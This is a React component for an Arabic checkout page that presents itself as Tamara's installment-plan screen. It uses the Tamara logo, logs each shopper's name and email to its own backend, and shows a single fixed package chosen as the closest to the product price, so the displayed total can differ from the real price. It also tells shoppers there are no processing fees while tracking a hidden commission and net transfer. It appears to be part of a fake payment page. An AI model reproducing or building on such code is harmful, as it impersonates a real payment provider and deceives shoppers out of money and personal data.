import { useState, useMemo, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { postCheckoutEvent } from '@/lib/api';
import type { InstallmentPackage } from '../types';
import TamaraLogo from '@/components/TamaraLogo';

interface SelectPlanProps {
  productPrice: number;
  productName: string;
  userName: string;
  userEmail: string;
  sessionId: string;
  onContinue: (selectedPackage: InstallmentPackage) => void;
  onBack: () => void;
}

interface Package {
  totalAmount: number;
  installmentsCount: number;
  perInstallment: number;
  commission: number;
}

const ALL_PACKAGES: Package[] = [
  // Product 7: 4140 -> 4 payments of 1035 = 4140
  { totalAmount: 4140, installmentsCount: 4, perInstallment: 1035, commission: 207 },
  // Product 4: 6000 -> 12 payments of 500 = 6000
  { totalAmount: 6000, installmentsCount: 12, perInstallment: 500, commission: 300 },
  // Product 9: 8280 -> 4 payments of 2070 = 8280
  { totalAmount: 8280, installmentsCount: 4, perInstallment: 2070, commission: 414 },
  // Product 6: 12420 -> 6 payments of 2070 = 12420
  { totalAmount: 12420, installmentsCount: 6, perInstallment: 2070, commission: 621 },
  // Product 8: 20700 -> 4 payments of 5175 = 20700
  { totalAmount: 20700, installmentsCount: 4, perInstallment: 5175, commission: 1035 },
  // Product 1: 24000 -> 24 payments of 1000 = 24000
  { totalAmount: 24000, installmentsCount: 24, perInstallment: 1000, commission: 1200 },
  // Product 5: 31050 -> 6 payments of 5175 = 31050
  { totalAmount: 31050, installmentsCount: 6, perInstallment: 5175, commission: 1553 },
  // Product 2: 50000 -> 12 payments (11 × 4167 + 4163) = 50000
  { totalAmount: 50000, installmentsCount: 12, perInstallment: 4167, commission: 2500 },
  // Product 11: 18000 -> Tabby only (no installments, but kept for reference)
  { totalAmount: 18000, installmentsCount: 1, perInstallment: 18000, commission: 900 },
  // Product 3: 100000 -> 36 payments (35 × 2778 + 2770) = 100000
  { totalAmount: 100000, installmentsCount: 36, perInstallment: 2778, commission: 5000 },
];

const SelectPlan = ({
  productPrice,
  productName,
  userName,
  userEmail,
  sessionId,
  onContinue,
  onBack,
}: SelectPlanProps) => {
  const [showDetails, setShowDetails] = useState(false);

  const formatPrice = (price: number) => {
    return new Intl.NumberFormat('en-US', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    }).format(price);
  };

  const closestPackage = useMemo(() => {
    const sorted = [...ALL_PACKAGES].sort((a, b) => {
      const diffA = Math.abs(a.totalAmount - productPrice);
      const diffB = Math.abs(b.totalAmount - productPrice);
      return diffA - diffB;
    });
    return sorted[0];
  }, [productPrice]);

  useEffect(() => {
    if (!closestPackage) return;
    postCheckoutEvent({
      sessionId,
      eventType: 'plan_selected',
      userName,
      userEmail,
      productName,
      productPrice,
      installments: closestPackage.installmentsCount,
      perInstallment: closestPackage.perInstallment,
      commission: closestPackage.commission,
      timestamp: new Date().toISOString(),
    }).catch(() => {});
  }, [sessionId, userName, userEmail, productName, productPrice, closestPackage]);

  const handleContinue = () => {
    if (closestPackage) {
      const installmentPackage: InstallmentPackage = {
        totalAmount: closestPackage.totalAmount,
        installmentsCount: closestPackage.installmentsCount,
        perInstallment: closestPackage.perInstallment,
        commission: closestPackage.commission,
        netTransfer: closestPackage.totalAmount - closestPackage.commission,
      };
      onContinue(installmentPackage);
    }
  };

  // تواريخ الدفع الثابتة
  const PAYMENT_DATES = [
    '٤ أبريل ٢٠٢٦',
    '٤ مايو ٢٠٢٦',
    '٤ يونيو ٢٠٢٦',
    '٤ يوليو ٢٠٢٦',
    '٤ أغسطس ٢٠٢٦',
    '٤ سبتمبر ٢٠٢٦',
  ];

  return (
    <div className="min-h-screen bg-white w-full" dir="rtl">
      {/* Header */}
      <div className="flex items-center justify-between px-5 py-4">
        <TamaraLogo className="h-6" />
        <div className="flex items-center gap-3">
          <button onClick={onBack} className="text-gray-500 text-sm">✕</button>
          <button className="text-gray-500 text-sm">English</button>
        </div>
      </div>

      {/* Content */}
      <div className="w-full px-4 pb-32">
        {/* Title Section */}
        <div className="mb-8 mt-6">
          <h1 className="text-[24px] font-bold text-black mb-2 text-right">اختر خطتك</h1>
          <p className="text-[14px] text-gray-600 text-right">
            حدد طريقة دفعك لـ {formatPrice(productPrice)} ريال
          </p>
        </div>

        {/* Plan Card - Single Package - Vertical Layout */}
        {closestPackage && (
          <div className="bg-[#f7f3ff] rounded-xl p-5 w-full flex flex-col gap-2">
            {/* Row 1: Payment + Installments count */}
            <div className="flex items-center justify-between gap-4">
              <span className="text-black font-semibold text-base">
                ادفع {formatPrice(closestPackage.perInstallment)} ريال اليوم
              </span>
              <span className="bg-[#ab8dff1a] text-[#5e47b7] px-2 py-1 rounded text-xs font-semibold">
                {closestPackage.installmentsCount} دفعات
              </span>
            </div>

            {/* Row 2: Monthly payment */}
            <div className="flex items-center justify-start">
              <span className="text-black font-semibold text-base">
                بعدها {formatPrice(closestPackage.perInstallment)} ريال
              </span>
            </div>

            {/* Row 3: Green note */}
            <div className="flex justify-end">
              <p className="text-[rgb(82,149,105)] text-xs pt-1 text-right">
                !هذه الخطة لا تشمل رسوم معالجة
              </p>
            </div>

            {/* Row 4: Centered Purple circle */}
            <div className="flex justify-center py-2">
              <div className="w-12 h-12 bg-[#9c6af8] rounded-full flex items-center justify-center text-white font-bold text-xl">
                {closestPackage.installmentsCount}
              </div>
            </div>

            {/* Details button */}
            <button
              onClick={() => setShowDetails(true)}
              className="w-full text-center text-black font-bold py-3 text-sm"
            >
              عرض التفاصيل
            </button>

            {/* Expanded details */}
            {showDetails && (
              <div className="mt-4 pt-4 border-t border-purple-200 space-y-2">
                <div className="flex items-center justify-between text-gray-700 text-sm">
                  <span>اليوم - {PAYMENT_DATES[0]}</span>
                  <span className="font-semibold">{formatPrice(closestPackage.perInstallment)} ريال</span>
                </div>
                {Array.from({ length: closestPackage.installmentsCount - 1 }, (_, i) => (
                  <div key={i} className="flex items-center justify-between text-gray-700 text-sm">
                    <span>الدفعة {i + 2} - {PAYMENT_DATES[i + 1] || ''}</span>
                    <span className="font-semibold">{formatPrice(closestPackage.perInstallment)} ريال</span>
                  </div>
                ))}
                <div className="flex items-center justify-between text-black font-bold text-base pt-2 border-t border-purple-200 mt-2">
                  <span>الإجمالي</span>
                  <span>{formatPrice(closestPackage.totalAmount)} ريال</span>
                </div>
              </div>
            )}
          </div>
        )}
      </div>

      {/* Fixed Bottom Button */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 p-4">
        <div className="max-w-lg mx-auto">
          <Button
            onClick={handleContinue}
            className="w-full py-3 font-bold rounded-lg bg-black hover:bg-gray-900 text-white"
          >
            متابعة الدفع
          </Button>
        </div>
      </div>
    </div>
  );
};

export default SelectPlan;
